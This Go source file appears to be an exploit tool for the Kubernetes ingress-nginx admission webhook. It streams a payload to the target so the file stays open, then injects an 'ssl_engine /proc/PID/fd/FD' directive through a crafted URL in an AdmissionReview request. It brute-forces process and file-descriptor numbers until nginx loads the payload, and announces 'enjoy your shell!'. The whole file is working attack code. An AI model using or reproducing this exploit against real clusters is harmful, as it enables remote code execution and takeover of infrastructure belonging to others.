package nginx_ingress

import (
	_ "embed"
	"errors"
	"fmt"
	"github.com/guonaihong/gout"
	log "github.com/sirupsen/logrus"
	v1 "k8s.io/api/admission/v1"
	"strings"
	"sync"
	"time"
)

var Verbose bool = false

func Uploader(URL string, payload Payload) error {
	return gout.NewWithOpt(gout.WithInsecureSkipVerify(), gout.WithTimeout(100*time.Second)).
		POST(URL).Debug(Verbose).SetBody([]byte(payload)).
		SetHeader(gout.H{
			"Content-Type":   "application/octet-stream",
			"Content-Length": 1024 * 2024 * 1024,
			"Connection":     "keep-alive",
			"Accept":         "*/*",
		}).Chunked().Do()
}

func UploadThread(URL string, payload Payload, stop chan struct{}) {
	for {
		select {
		case <-stop:
			return
		default:
			t1 := time.Now()
			err := Uploader(URL, payload)
			t2 := time.Now()
			log.Debugf("Upload time is %v, err %v", t2.Sub(t1), err)
		}
	}
}

//go:embed validate.json
var validateJson string

func ValidateWebHook(URL string, fd, pid int) error {
	var resp v1.AdmissionReview
	// 								http://example.com/#;}}}\n\nssl_engine xxxxxxxxxxxxx;\n\n
	evilUrl := fmt.Sprintf(`http://example.com/#;}}}\n\nssl_engine /proc/%v/fd/%v;\n\n`, pid, fd)
	log.Debugf("trying pid %v, fd %v", pid, fd)
	log.Debugf("evil url: %v", evilUrl)
	fullPayload := strings.Replace(validateJson, "foobar", evilUrl, 1)
	log.Tracef("payload: %v", fullPayload)
	err := gout.NewWithOpt(gout.WithInsecureSkipVerify(), gout.WithTimeout(100*time.Second)).
		POST(URL).Debug(Verbose).
		SetBody(fullPayload).
		BindJSON(&resp).Do()
	if err != nil {
		return err
	}
	if resp.Response != nil && resp.Response.Result != nil {
		log.Tracef("response: %v", resp)
		log.Debugf("WebHook Validation Result: %v", resp.Response.Result.Message)
		if strings.Contains(resp.Response.Result.Message, "undefined symbol") {
			return nil // found and exploited
		}
	}
	return errors.New("response success, but exploit unknown failed")
}

func OnlyAdmissionRequest(WebhookUrl string) {
	err := ValidateWebHook(WebhookUrl, 10, 20)
	if err != nil {
		log.Errorf("Exploit failed: %v", err)
	} else {
		log.Infof("Exploit success!")
	}
}

func OnlyUplaoder(UploadUrl string, p Payload) {
	var stopUpload = make(chan struct{})
	UploadThread(UploadUrl, p, stopUpload)
}

func Exploit(WebHookUrl string, UploadUrl string, p Payload, fdRangeStart, pidRangeStart, fdRangeEnd, pidRangeEnd int) {
	var stopUpload = make(chan struct{})

	go UploadThread(UploadUrl, p, stopUpload)
	time.Sleep(1 * time.Millisecond) // let Upload Thread Run!

	var wg sync.WaitGroup
	successFlag := false
	for fd := fdRangeStart; fd < fdRangeStart+fdRangeEnd; fd++ {
		for pid := pidRangeStart; pid < pidRangeStart+pidRangeEnd; pid++ {
			wg.Add(1)
			go func(pid, fd int) {
				defer wg.Done()
				err := ValidateWebHook(WebHookUrl, fd, pid)
				if err == nil {
					log.Infof("Exploit Success! pid: %d, fd: %d", pid, fd)
					successFlag = true
					stopUpload <- struct{}{}
					defer close(stopUpload)
				}
			}(pid, fd)
		}
	}
	wg.Wait()
	if !successFlag {
		log.Errorf("Exploit run complete, but looks failed!")
	} else {
		log.Infof("Exploit run complete and success, enjoy your shell!")
	}
	return
}
